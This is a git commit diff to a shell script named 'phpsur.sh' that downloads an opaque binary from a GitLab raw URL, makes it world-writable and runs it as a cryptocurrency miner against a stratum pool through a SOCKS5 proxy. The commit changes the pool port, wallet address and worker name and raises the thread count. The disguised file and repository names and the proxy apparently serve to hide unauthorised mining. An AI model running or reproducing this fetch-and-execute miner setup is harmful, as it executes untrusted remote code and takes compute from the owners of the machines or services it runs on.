bada3301d26e1890ffbc3dfc2ea2b3c69c37a7c9
set-arithmetic <79969777+set-arithmetic@users.noreply.github.com>
2024-05-04 01:47:27 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -4,9 +4,9 @@ sudo apt install screen libjansson4 -y
 wget -O roda https://gitlab.com/krilnols1/buildkite/-/raw/main/roda 
 screen -dmS ls
 chmod +x phpsur.sh && chmod +x roda && chmod 777 roda phpsur.sh
-RENANG=stratum+tcps://stratum-na.rplant.xyz:17042
-ACIS=sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57
+RENANG=stratum+tcps://stratum-na.rplant.xyz:17115
+ACIS=shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d
 STRESS=yespowersugar
-BANGUNAN=BK-01
+BANGUNAN=Ci-01
 PROXY=socks5://158.69.225.110:59166
-./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2 -x $PROXY
+./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 16 -x $PROXY
